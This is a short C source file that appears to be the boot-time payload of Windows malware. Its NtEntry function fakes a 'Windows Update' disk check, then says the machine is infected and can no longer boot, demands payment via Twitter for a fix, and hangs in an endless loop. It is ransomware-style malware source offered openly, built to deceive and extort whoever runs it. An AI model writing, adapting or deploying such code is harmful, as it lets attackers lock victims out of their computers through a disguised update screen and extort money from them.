




#include "tools.h"

void NtEntry(){
    RtlDrawBootText(L"Please wait while Windows Update gets itself ready...\n");
    RtlSleep(6000);
    RtlDrawTextOnBluescreenScreen(L"Checking file system of C:\nType of File System is NTFS\n\n");
    RtlDrawTextOnBluescreenScreen(L"Windows Update needs to check your disks for consistency\nPlease do not leave this screen\n\n");
    for(int i = 0; i < 10; i++){
        RtlDrawTextOnBluescreenScreen(L"Checking Sector NULL of C:\n");
        RtlSleep(8000);
        continue;
    }
    RtlDrawBootText(L"Finished Checking Disk, Starting Next Phase of the Update...");
    RtlSleep(2000);
    RtlDrawTextOnBluescreenScreen(L"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
    RtlDrawTextOnBluescreenScreen(L"YOU HAVE BEEN INFECTED BY [insert random creative name]\n\n");
    RtlDrawTextOnBluescreenScreen(L"If you got this, well idk what you want me to do, but uh you can't boot to your machine anymore\n");
    RtlDrawTextOnBluescreenScreen(L"Idk message me in twitter and pay me a buck and ill give you the way to fix your PC\n\n");
    while(1){continue;}
}